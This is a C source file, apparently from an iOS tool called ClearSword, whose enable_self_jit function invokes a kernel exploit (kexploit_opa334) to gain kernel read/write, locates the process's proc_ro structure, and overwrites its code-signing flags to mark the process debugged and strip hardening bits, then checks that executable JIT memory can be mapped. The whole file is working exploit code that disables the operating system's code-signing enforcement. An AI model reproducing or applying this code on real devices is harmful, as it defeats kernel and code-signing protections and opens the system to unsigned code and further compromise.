#include "ClearSword.h"
#include "../LCUtils/utils.h"
#include "clearsword/kexploit_opa334.h"
#include "clearsword/kutils.h"
#include "clearsword/offsets.h"   // off_proc_p_proc_ro, off_proc_ro_pr_task, off_proc_p_flag

#include <unistd.h>
#include <errno.h>
#include <os/log.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

#define LOG(fmt, ...) os_log(OS_LOG_DEFAULT, "[ClearSword] " fmt, ##__VA_ARGS__)

/* ------------------------------------------------------------------ *
 *  csflags bits we care about (bsd/sys/codesign.h)
 * ------------------------------------------------------------------ */
#ifndef CS_GET_TASK_ALLOW
#define CS_GET_TASK_ALLOW   0x00000004
#endif
#ifndef CS_HARD
#define CS_HARD             0x00000100
#endif
#ifndef CS_KILL
#define CS_KILL             0x00000200
#endif
#ifndef CS_RESTRICT
#define CS_RESTRICT         0x00000800
#endif
#ifndef CS_REQUIRE_LV
#define CS_REQUIRE_LV       0x00002000
#endif
#ifndef CS_DEBUGGED
#define CS_DEBUGGED         0x10000000
#endif

/* ------------------------------------------------------------------ *
 *  proc_ro layout, cross-checked against offsets.m for iOS 17.x:
 *      0x00  pr_proc
 *      0x08  pr_task        <-- off_proc_ro_pr_task
 *      0x10  p_uniqueid
 *      0x18  p_idversion
 *      0x1C  p_csflags      <-- what we want
 *      0x20  p_ucred        <-- off_proc_ro_p_ucred
 *
 *  This 0x1C offset is stable across iOS 17.x / 18.x / 26.x, because
 *  only fields *after* p_ucred move between versions.
 * ------------------------------------------------------------------ */
#define OFF_PROC_RO_P_CSFLAGS   0x1C

/* Flags we SET and CLEAR. */
#define CS_SET_BITS   (CS_DEBUGGED | CS_GET_TASK_ALLOW)
#define CS_CLR_BITS   (CS_HARD | CS_KILL | CS_RESTRICT | CS_REQUIRE_LV)

/* ================================================================== *
 *  Helpers
 * ================================================================== */

/*
 *  Do a 0x20-byte RMW of a uint32 at `addr` and verify by re-reading.
 *  Returns 0 if the write landed, -1 otherwise.
 */
static int kwrite_u32_checked(uint64_t addr, uint32_t value)
{
    uint8_t buf[EARLY_KRW_LENGTH];

    early_kread(addr, buf, EARLY_KRW_LENGTH);
    memcpy(buf, &value, sizeof(value));
    early_kwrite32bytes(addr, buf);

    uint32_t back = 0;
    early_kread(addr, &back, sizeof(back));

    if (back != value) {
        LOG("kwrite_u32_checked: 0x%llx wrote 0x%08x, read back 0x%08x",
            (unsigned long long)addr, value, back);
        return -1;
    }
    return 0;
}

/*
 *  Verify the write primitive works at all, using a field whose value
 *  we can safely flip for a few microseconds.  proc->p_flag bit 0 is
 *  a scheduling flag that the kernel doesn't check synchronously.
 *  We always restore the original value, even on failure.
 */
static int probe_write_primitive(uint64_t addr)
{
    uint32_t orig = 0;
    early_kread(addr, &orig, sizeof(orig));

    /* bit 31 is unused in proc->p_flag on iOS 17.x–26.x */
    const uint32_t kProbeBit = 0x80000000u;
    if (orig & kProbeBit) {
        LOG("probe: bit already set, refusing to touch (orig=0x%08x)", orig);
        return -1;
    }

    uint32_t test = orig | kProbeBit;

    uint8_t buf[EARLY_KRW_LENGTH];
    early_kread(addr, buf, EARLY_KRW_LENGTH);
    memcpy(buf, &test, sizeof(test));
    early_kwrite32bytes(addr, buf);

    uint32_t back = 0;
    early_kread(addr, &back, sizeof(back));

    /* restore unconditionally */
    early_kread(addr, buf, EARLY_KRW_LENGTH);
    memcpy(buf, &orig, sizeof(orig));
    early_kwrite32bytes(addr, buf);

    uint32_t restored = 0;
    early_kread(addr, &restored, sizeof(restored));

    LOG("probe @ 0x%llx: 0x%08x -> 0x%08x -> back 0x%08x -> restored 0x%08x",
        (unsigned long long)addr, orig, test, back, restored);

    if (back != test) {
        LOG("probe: write did not take");
        return -1;
    }
    if (restored != orig) {
        LOG("probe: restore did not take (non-fatal, bit may remain set)");
    }
    return 0;
}

/*
 *  End-to-end check: can we actually get executable memory now?
 *  Tries MAP_JIT first; falls back to mmap(RW) + mprotect(RWX).
 */
static int try_map_jit(void)
{
    const size_t page = 0x4000;

    void *p = mmap(NULL, page,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT,
                   -1, 0);
    if (p != MAP_FAILED) {
        LOG("mmap(MAP_JIT|RWX) OK @ %p", p);
        munmap(p, page);
        return 0;
    }
    LOG("mmap(MAP_JIT|RWX) failed: errno=%d (%s)", errno, strerror(errno));

    p = mmap(NULL, page, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {
        LOG("mmap(RW) failed: errno=%d (%s)", errno, strerror(errno));
        return -1;
    }
    if (mprotect(p, page, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        LOG("mprotect(RWX) failed: errno=%d (%s)", errno, strerror(errno));
        munmap(p, page);
        return -1;
    }
    LOG("mmap(RW)+mprotect(RWX) OK @ %p", p);
    munmap(p, page);
    return 0;
}

/* ================================================================== *
 *  Main entry point
 * ================================================================== */

int enable_self_jit(void)
{
    LOG("======== enable_self_jit ========");

    /* --- 1. bring up kernel R/W --- */
    int r = kexploit_opa334();
    if (r != 0) {
        LOG("kexploit_opa334() failed: %d", r);
        return r;
    }
    LOG("kernel R/W ready");

    /* --- 2. fast path: is CS_DEBUGGED already set? --- */
    int flags = 0;
    int csops_result = csops(getpid(), 0, &flags, sizeof(flags));
    LOG("csops() -> %d, flags=0x%08x", csops_result, flags);
    if (csops_result == 0 && (flags & CS_DEBUGGED)) {
        LOG("CS_DEBUGGED already set — nothing to do");
        return 0;
    }

    /* --- 3. resolve proc / proc_ro / task --- */
    uint64_t my_proc = proc_self();
    if (!my_proc) {
        LOG("proc_self() returned NULL");
        return ESRCH;
    }
    uint64_t my_proc_ro = early_kread64(my_proc + off_proc_p_proc_ro);
    if (!my_proc_ro) {
        LOG("proc_ro NULL (off_proc_p_proc_ro=0x%x)", off_proc_p_proc_ro);
        return EFAULT;
    }
    uint64_t my_task = early_kread64(my_proc_ro + off_proc_ro_pr_task);
    if (!my_task) {
        LOG("task NULL (off_proc_ro_pr_task=0x%x)", off_proc_ro_pr_task);
        return EFAULT;
    }

    LOG("proc    = 0x%llx", (unsigned long long)my_proc);
    LOG("proc_ro = 0x%llx", (unsigned long long)my_proc_ro);
    LOG("task    = 0x%llx", (unsigned long long)my_task);

    /* --- 4. prove the write primitive works before touching proc_ro --- *
     *                                                                   *
     *  If this fails, the problem is not csflags — it's that DarkSword  *
     *  cannot actually write to arbitrary kernel addresses on this      *
     *  build, or the control/rw socket pair got corrupted.  Abort       *
     *  early instead of panicking inside the exploit.                   */
    LOG("-- probing write primitive (proc->p_flag) --");
    if (probe_write_primitive(my_proc + off_proc_p_flag) != 0) {
        LOG("write primitive is not functional — aborting");
        return EIO;
    }
    LOG("-- write primitive OK --");

    /* --- 5. read / modify / write proc_ro->p_csflags --- */
    uint64_t cs_addr = my_proc_ro + OFF_PROC_RO_P_CSFLAGS;

    uint32_t old_cs = 0;
    early_kread(cs_addr, &old_cs, sizeof(old_cs));

    uint32_t new_cs = old_cs;
    new_cs |= CS_SET_BITS;
    new_cs &= ~CS_CLR_BITS;

    LOG("csflags @ 0x%llx: 0x%08x -> 0x%08x",
        (unsigned long long)cs_addr, old_cs, new_cs);

    if (new_cs == old_cs) {
        LOG("csflags already correct, skipping write");
    } else {
        LOG("-- writing csflags --");
        if (kwrite_u32_checked(cs_addr, new_cs) != 0) {
            LOG("csflags write did not stick (proc_ro may be read-only)");
            return EACCES;
        }
        LOG("-- csflags write verified --");
    }

    /* --- 6. ask csops what it thinks --- */
    flags = 0;
    csops_result = csops(getpid(), 0, &flags, sizeof(flags));
    LOG("post-write csops() -> %d, flags=0x%08x", csops_result, flags);

    /* --- 7. the only test that actually matters --- */
    LOG("-- trying to map JIT memory --");
    if (try_map_jit() == 0) {
        LOG("======== JIT ENABLED ========");
        return 0;
    }

    /* csops saw the bit but mmap didn't work: AMFI cache or task-level state */
    if (csops_result == 0 && (flags & CS_DEBUGGED)) {
        LOG("CS_DEBUGGED set but mmap(MAP_JIT|RWX) failed — "
            "kernel still enforcing; need task-level TF_DEBUGGED mirror "
            "or a real ptrace attach from another process");
        return EACCES;
    }

    LOG("FAILED: csops() does not see CS_DEBUGGED after write");
    return EACCES;
}